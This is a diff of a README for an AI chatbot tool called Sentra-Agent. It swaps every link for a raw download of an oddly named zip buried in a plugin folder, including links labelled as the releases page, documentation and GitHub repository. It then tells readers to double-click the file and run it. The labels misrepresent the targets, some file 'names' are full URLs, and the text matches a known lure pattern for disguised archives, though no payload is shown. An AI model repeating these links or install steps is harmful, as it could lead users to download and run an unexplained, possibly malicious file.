@@ -2,7 +2,7 @@
 
 ## 📥 Download Here
 
-[![Download Sentra-Agent](https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip)](https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip)
+[![Download Sentra-Agent](https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip)](https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip)
 
 ## 🚀 Getting Started
 
@@ -33,11 +33,11 @@ To install Sentra-Agent, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the release page:
    
-   [Download Latest Version](https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip)
+   [Download Latest Version](https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip)
 
 2. **Choose a Version:** On the releases page, find the latest version of Sentra-Agent. Look for the version marked as the latest under the "Latest Release" section.
 
-3. **Download the File:** Click on the download link for your operating system. Files may be named like `https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip` for Windows or `https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip` for Mac users.
+3. **Download the File:** Click on the download link for your operating system. Files may be named like `https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip` for Windows or `https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip` for Mac users.
 
 4. **Run the Installer:** Once the file is downloaded, locate it on your computer. Double-click the file to begin the installation. Follow the on-screen instructions to complete the installation.
 
@@ -56,7 +56,7 @@ After launching Sentra-Agent, you can start creating your first chatbot with the
 
 To help you get started, Sentra-Agent provides various resources:
 
-- **Documentation:** Comprehensive guides and tutorials are available within the application and on the [GitHub repository](https://raw.githubusercontent.com/andyrizqyhar/Sentra-Agent/main/sentra-mcp/src/mcpcore/Sentra-Agent_v1.8-beta.2.zip).
+- **Documentation:** Comprehensive guides and tutorials are available within the application and on the [GitHub repository](https://github.com/andyrizqyhar/Sentra-Agent/raw/refs/heads/main/sentra-mcp/plugins/qq_message_getFriendHistory/Agent-Sentra-cogitativeness.zip).
 - **Community Support:** Join forums and discussion groups focused on AI chatbot development for support and ideas.
 
 ## 🌐 Feedback and Contributions
